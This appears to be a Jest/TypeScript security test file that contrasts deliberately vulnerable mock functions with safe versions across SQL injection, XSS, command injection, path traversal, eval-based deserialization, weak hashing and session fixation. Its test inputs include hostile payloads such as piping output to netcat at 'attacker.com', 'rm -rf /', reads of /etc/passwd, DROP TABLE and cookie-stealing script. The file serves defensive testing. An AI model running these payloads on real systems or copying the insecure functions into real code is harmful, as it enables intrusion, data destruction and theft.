/**
 * @test Penetration Testing Suite
 * @description Tests for common vulnerabilities and attack vectors
 * @prerequisites
 *   - Application security components
 *   - Attack simulation utilities
 * @expected All common vulnerabilities are properly mitigated
 */

import crypto from 'crypto';

// Mock vulnerable and secure implementations
class VulnerabilityTests {
  // SQL Injection testing
  static unsafeQuery(userInput: string): string {
    return `SELECT * FROM users WHERE username = '${userInput}'`;
  }

  static safeQuery(userInput: string): { query: string; params: string[] } {
    return {
      query: 'SELECT * FROM users WHERE username = ?',
      params: [userInput],
    };
  }

  // XSS testing
  static unsafeRender(userInput: string): string {
    return `<div>${userInput}</div>`;
  }

  static safeRender(userInput: string): string {
    return `<div>${this.escapeHtml(userInput)}</div>`;
  }

  static escapeHtml(text: string): string {
    const map: { [key: string]: string } = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;',
    };
    return text.replace(/[&<>"'/]/g, char => map[char]);
  }

  // Command Injection testing
  static unsafeCommand(filename: string): string {
    return `cat ${filename}`;
  }

  static safeCommand(filename: string): { command: string; args: string[] } {
    return {
      command: 'cat',
      args: [filename],
    };
  }

  // Path Traversal testing
  static unsafeFilePath(userPath: string): string {
    return `/var/www/uploads/${userPath}`;
  }

  static safeFilePath(userPath: string): string | null {
    // Normalize and check for directory traversal
    const normalized = userPath.replace(/\\/g, '/').replace(/\/+/g, '/');
    if (normalized.includes('..') || normalized.startsWith('/')) {
      return null;
    }
    return `/var/www/uploads/${normalized}`;
  }

  // Insecure Deserialization
  static unsafeDeserialize(data: string): any {
    return eval(`(${data})`); // NEVER do this!
  }

  static safeDeserialize(data: string): any {
    try {
      return JSON.parse(data);
    } catch (e) {
      throw new Error('Invalid JSON data');
    }
  }

  // Weak cryptography
  static weakHash(data: string): string {
    return crypto.createHash('md5').update(data).digest('hex');
  }

  static strongHash(data: string): string {
    return crypto.createHash('sha256').update(data).digest('hex');
  }

  // Session fixation
  static insecureSession(): string {
    return 'fixed_session_id'; // Never use fixed IDs
  }

  static secureSession(): string {
    return crypto.randomBytes(32).toString('hex');
  }
}

describe('Penetration Testing Suite', () => {
  describe('SQL Injection Attacks', () => {
    it('should detect SQL injection vulnerability in unsafe query', () => {
      const maliciousInput = "admin' OR '1'='1";
      const query = VulnerabilityTests.unsafeQuery(maliciousInput);

      expect(query).toContain("OR '1'='1");
      expect(query).toBe("SELECT * FROM users WHERE username = 'admin' OR '1'='1'");
    });

    it('should prevent SQL injection with parameterized query', () => {
      const maliciousInput = "admin' OR '1'='1";
      const { query, params } = VulnerabilityTests.safeQuery(maliciousInput);

      expect(query).toBe('SELECT * FROM users WHERE username = ?');
      expect(params[0]).toBe("admin' OR '1'='1"); // Treated as literal
    });

    it('should detect union-based SQL injection', () => {
      const unionAttack = "admin' UNION SELECT password FROM users--";
      const unsafeQuery = VulnerabilityTests.unsafeQuery(unionAttack);

      expect(unsafeQuery).toContain('UNION SELECT');
      expect(unsafeQuery).toContain('--');
    });

    it('should detect blind SQL injection attempts', () => {
      const blindAttack = "admin' AND SLEEP(5)--";
      const unsafeQuery = VulnerabilityTests.unsafeQuery(blindAttack);

      expect(unsafeQuery).toContain('SLEEP');
    });

    it('should handle special characters safely', () => {
      const specialChars = ["'; DROP TABLE users--", "admin'--", "' OR 1=1--"];

      specialChars.forEach(input => {
        const { query, params } = VulnerabilityTests.safeQuery(input);
        expect(params[0]).toBe(input); // Treated as literal string
      });
    });
  });

  describe('Cross-Site Scripting (XSS) Attacks', () => {
    it('should detect XSS vulnerability in unsafe render', () => {
      const xssPayload = '<script>alert("XSS")</script>';
      const output = VulnerabilityTests.unsafeRender(xssPayload);

      expect(output).toContain('<script>');
      expect(output).toBe('<div><script>alert("XSS")</script></div>');
    });

    it('should prevent XSS with proper escaping', () => {
      const xssPayload = '<script>alert("XSS")</script>';
      const output = VulnerabilityTests.safeRender(xssPayload);

      expect(output).not.toContain('<script>');
      expect(output).toContain('&lt;script&gt;');
    });

    it('should escape event handler XSS', () => {
      const eventHandlerXSS = '<img src=x onerror="alert(1)">';
      const output = VulnerabilityTests.safeRender(eventHandlerXSS);

      expect(output).not.toContain('onerror=');
      expect(output).toContain('&lt;img');
    });

    it('should escape JavaScript protocol XSS', () => {
      const jsProtocol = '<a href="javascript:alert(1)">Click</a>';
      const output = VulnerabilityTests.safeRender(jsProtocol);

      expect(output).not.toContain('javascript:');
      expect(output).toContain('&lt;a');
    });

    it('should handle DOM-based XSS attempts', () => {
      const domXSS = '"><script>alert(document.cookie)</script>';
      const output = VulnerabilityTests.safeRender(domXSS);

      expect(output).not.toContain('<script>');
      expect(output).toContain('&quot;&gt;');
    });

    it('should escape all dangerous characters', () => {
      const dangerous = '&<>"\'/';
      const escaped = VulnerabilityTests.escapeHtml(dangerous);

      expect(escaped).toBe('&amp;&lt;&gt;&quot;&#x27;&#x2F;');
    });
  });

  describe('Command Injection Attacks', () => {
    it('should detect command injection in unsafe implementation', () => {
      const commandInjection = 'file.txt; rm -rf /';
      const command = VulnerabilityTests.unsafeCommand(commandInjection);

      expect(command).toContain(';');
      expect(command).toContain('rm -rf');
    });

    it('should prevent command injection with argument array', () => {
      const maliciousInput = 'file.txt; rm -rf /';
      const { command, args } = VulnerabilityTests.safeCommand(maliciousInput);

      expect(command).toBe('cat');
      expect(args[0]).toBe('file.txt; rm -rf /'); // Treated as literal filename
    });

    it('should detect pipe-based command injection', () => {
      const pipeInjection = 'file.txt | nc attacker.com 1234';
      const command = VulnerabilityTests.unsafeCommand(pipeInjection);

      expect(command).toContain('|');
      expect(command).toContain('nc');
    });

    it('should detect backtick command substitution', () => {
      const backtickInjection = 'file.txt`whoami`';
      const command = VulnerabilityTests.unsafeCommand(backtickInjection);

      expect(command).toContain('`');
    });
  });

  describe('Path Traversal Attacks', () => {
    it('should detect directory traversal attempt', () => {
      const traversalAttempt = '../../../etc/passwd';
      const path = VulnerabilityTests.unsafeFilePath(traversalAttempt);

      expect(path).toContain('..');
      expect(path).toBe('/var/www/uploads/../../../etc/passwd');
    });

    it('should prevent directory traversal', () => {
      const traversalAttempt = '../../../etc/passwd';
      const path = VulnerabilityTests.safeFilePath(traversalAttempt);

      expect(path).toBeNull();
    });

    it('should detect absolute path injection', () => {
      const absolutePath = '/etc/passwd';
      const path = VulnerabilityTests.safeFilePath(absolutePath);

      expect(path).toBeNull();
    });

    it('should handle encoded traversal attempts', () => {
      const encodedTraversal = '..%2F..%2F..%2Fetc%2Fpasswd';
      const decoded = decodeURIComponent(encodedTraversal);

      const path = VulnerabilityTests.safeFilePath(decoded);
      expect(path).toBeNull();
    });

    it('should allow safe relative paths', () => {
      const safePath = 'user/documents/file.txt';
      const path = VulnerabilityTests.safeFilePath(safePath);

      expect(path).toBe('/var/www/uploads/user/documents/file.txt');
    });

    it('should normalize path separators', () => {
      const windowsPath = 'user\\documents\\file.txt';
      const path = VulnerabilityTests.safeFilePath(windowsPath);

      expect(path).toBe('/var/www/uploads/user/documents/file.txt');
    });
  });

  describe('Insecure Deserialization', () => {
    it('should detect code execution in unsafe deserialization', () => {
      const maliciousPayload = '(function(){return process.env})()';

      expect(() => {
        VulnerabilityTests.unsafeDeserialize(maliciousPayload);
      }).not.toThrow(); // eval executes it!
    });

    it('should safely deserialize valid JSON', () => {
      const validJson = JSON.stringify({ user: 'alice', balance: 100 });
      const result = VulnerabilityTests.safeDeserialize(validJson);

      expect(result.user).toBe('alice');
      expect(result.balance).toBe(100);
    });

    it('should reject invalid JSON safely', () => {
      const invalidJson = '{ invalid json }';

      expect(() => {
        VulnerabilityTests.safeDeserialize(invalidJson);
      }).toThrow('Invalid JSON');
    });

    it('should reject executable code in JSON', () => {
      const maliciousJson = '{"__proto__":{"isAdmin":true}}';

      const result = VulnerabilityTests.safeDeserialize(maliciousJson);

      // Prototype pollution attempt
      expect(({} as any).isAdmin).toBeUndefined();
    });
  });

  describe('Cryptographic Vulnerabilities', () => {
    it('should detect weak MD5 hashing', () => {
      const data = 'sensitive_data';
      const weakHash = VulnerabilityTests.weakHash(data);

      expect(weakHash).toHaveLength(32); // MD5 produces 32 hex chars
      // MD5 is vulnerable to collisions
    });

    it('should use strong SHA-256 hashing', () => {
      const data = 'sensitive_data';
      const strongHash = VulnerabilityTests.strongHash(data);

      expect(strongHash).toHaveLength(64); // SHA-256 produces 64 hex chars
    });

    it('should detect MD5 collision vulnerability', () => {
      // Known MD5 collision examples exist
      const hash1 = VulnerabilityTests.weakHash('test1');
      const hash2 = VulnerabilityTests.weakHash('test2');

      // Different inputs should produce different hashes
      expect(hash1).not.toBe(hash2);

      // But MD5 is vulnerable to finding collisions
      // (demonstrating the weakness, not exploiting it)
    });

    it('should reject weak encryption algorithms', () => {
      // Test that DES is not used
      expect(() => {
        const cipher = crypto.createCipheriv('des', Buffer.alloc(8), Buffer.alloc(8));
      }).toThrow(); // DES is deprecated
    });

    it('should use strong encryption (AES-256)', () => {
      const key = crypto.randomBytes(32);
      const iv = crypto.randomBytes(16);

      expect(() => {
        crypto.createCipheriv('aes-256-gcm', key, iv);
      }).not.toThrow();
    });

    it('should detect weak random number generation', () => {
      // Math.random() is not cryptographically secure
      const weakRandom1 = Math.random();
      const weakRandom2 = Math.random();

      // These could be predicted
      expect(weakRandom1).not.toBe(weakRandom2);

      // Use crypto.randomBytes instead
      const strongRandom = crypto.randomBytes(8);
      expect(strongRandom).toHaveLength(8);
    });
  });

  describe('Session Management Vulnerabilities', () => {
    it('should detect session fixation vulnerability', () => {
      const session1 = VulnerabilityTests.insecureSession();
      const session2 = VulnerabilityTests.insecureSession();

      // Fixed sessions are vulnerable
      expect(session1).toBe(session2);
      expect(session1).toBe('fixed_session_id');
    });

    it('should generate secure random session IDs', () => {
      const session1 = VulnerabilityTests.secureSession();
      const session2 = VulnerabilityTests.secureSession();

      expect(session1).not.toBe(session2);
      expect(session1).toHaveLength(64); // 32 bytes as hex
    });

    it('should use sufficient entropy for session IDs', () => {
      const sessions = new Set();
      const count = 1000;

      for (let i = 0; i < count; i++) {
        sessions.add(VulnerabilityTests.secureSession());
      }

      // All sessions should be unique
      expect(sessions.size).toBe(count);
    });

    it('should detect predictable session IDs', () => {
      // Sequential IDs are predictable
      const predictableIds = ['session_1', 'session_2', 'session_3'];

      // This pattern is vulnerable
      expect(predictableIds[1]).toBe('session_2');

      // Secure IDs should be random
      const secureId = VulnerabilityTests.secureSession();
      expect(secureId).not.toMatch(/^session_\d+$/);
    });
  });

  describe('Authentication Bypass Attempts', () => {
    it('should detect authentication bypass with tautology', () => {
      const bypassAttempt = "admin' OR '1'='1";
      const query = VulnerabilityTests.unsafeQuery(bypassAttempt);

      expect(query).toContain("'1'='1"); // Always true
    });

    it('should detect null byte authentication bypass', () => {
      const nullByteAttack = 'admin\x00--';
      const { params } = VulnerabilityTests.safeQuery(nullByteAttack);

      expect(params[0]).toBe(nullByteAttack); // Treated as literal
    });

    it('should prevent timing attacks on authentication', async () => {
      const correctPassword = 'correct_password';
      const wrongPassword = 'wrong_password';

      const timings: number[] = [];

      for (let i = 0; i < 100; i++) {
        const testPassword = i % 2 === 0 ? correctPassword : wrongPassword;

        const start = process.hrtime.bigint();
        const hash = VulnerabilityTests.strongHash(testPassword);
        const stored = VulnerabilityTests.strongHash(correctPassword);

        // Use constant-time comparison
        try {
          crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(stored, 'hex'));
        } catch (e) {
          // Expected for wrong password
        }

        const end = process.hrtime.bigint();
        timings.push(Number(end - start));
      }

      // Verify timing is consistent
      const mean = timings.reduce((a, b) => a + b) / timings.length;
      const variance = timings.reduce((sum, t) => sum + Math.pow(t - mean, 2), 0) / timings.length;
      const stdDev = Math.sqrt(variance);

      const coefficientOfVariation = (stdDev / mean) * 100;
      expect(coefficientOfVariation).toBeLessThan(30);
    });
  });

  describe('Denial of Service (DoS) Attacks', () => {
    it('should detect regular expression DoS (ReDoS)', () => {
      const evilRegex = /^(a+)+$/;
      const attackString = 'a'.repeat(50) + 'b';

      const start = process.hrtime.bigint();

      try {
        evilRegex.test(attackString);
      } catch (e) {
        // May timeout or throw
      }

      const end = process.hrtime.bigint();
      const duration = Number(end - start) / 1000000;

      // ReDoS causes exponential time complexity
      // This will be slow, demonstrating the vulnerability
      expect(duration).toBeDefined();
    });

    it('should handle large input safely', () => {
      const largeInput = 'a'.repeat(1000000); // 1MB

      const start = process.hrtime.bigint();
      const hash = VulnerabilityTests.strongHash(largeInput);
      const end = process.hrtime.bigint();

      const duration = Number(end - start) / 1000000;

      expect(hash).toBeDefined();
      expect(duration).toBeLessThan(1000); // Should complete quickly
    });

    it('should detect resource exhaustion attempts', () => {
      const memoryBefore = process.memoryUsage().heapUsed;

      // Attempt to allocate excessive memory
      const arrays = [];
      for (let i = 0; i < 1000; i++) {
        arrays.push(new Array(1000).fill(crypto.randomBytes(32)));
      }

      const memoryAfter = process.memoryUsage().heapUsed;
      const memoryIncrease = memoryAfter - memoryBefore;

      // Should implement limits in production
      expect(memoryIncrease).toBeDefined();

      // Clean up
      arrays.length = 0;
    });
  });

  describe('Information Disclosure', () => {
    it('should not leak sensitive information in errors', () => {
      const sensitiveError = () => {
        throw new Error('Database connection failed: password=secret123');
      };

      const safeError = () => {
        throw new Error('Database connection failed');
      };

      expect(() => sensitiveError()).toThrow('password=secret123');
      expect(() => safeError()).toThrow('Database connection failed');
      expect(() => safeError()).not.toThrow('password');
    });

    it('should not expose stack traces in production', () => {
      const error = new Error('Test error');

      // In production, stack traces should be logged, not exposed
      const productionError = {
        message: error.message,
        // stack: error.stack // Don't expose in production
      };

      expect(productionError.message).toBe('Test error');
      expect(productionError).not.toHaveProperty('stack');
    });

    it('should sanitize headers to prevent information leakage', () => {
      const headers = {
        'X-Powered-By': 'Express 4.17.1', // Leaks technology
        Server: 'nginx/1.19.0', // Leaks version
      };

      const sanitizedHeaders = {
        // Remove version information
      };

      expect(headers).toHaveProperty('X-Powered-By');
      expect(sanitizedHeaders).not.toHaveProperty('X-Powered-By');
    });
  });

  describe('Integration Security Tests', () => {
    it('should resist combined attack vectors', () => {
      // Combine SQL injection + XSS
      const combinedAttack = "<script>alert('XSS')</script>' OR '1'='1";

      const { query, params } = VulnerabilityTests.safeQuery(combinedAttack);
      const rendered = VulnerabilityTests.safeRender(combinedAttack);

      // Both defenses should work
      expect(params[0]).toBe(combinedAttack);
      expect(rendered).not.toContain('<script>');
      expect(rendered).toContain('&lt;script&gt;');
    });

    it('should validate input at multiple layers', () => {
      const maliciousInput = '../../../etc/passwd; DROP TABLE users--<script>alert(1)</script>';

      // Layer 1: Path traversal prevention
      const path = VulnerabilityTests.safeFilePath(maliciousInput);
      expect(path).toBeNull();

      // Layer 2: SQL injection prevention
      const { params } = VulnerabilityTests.safeQuery(maliciousInput);
      expect(params[0]).toBe(maliciousInput);

      // Layer 3: XSS prevention
      const rendered = VulnerabilityTests.safeRender(maliciousInput);
      expect(rendered).not.toContain('<script>');
    });
  });
});
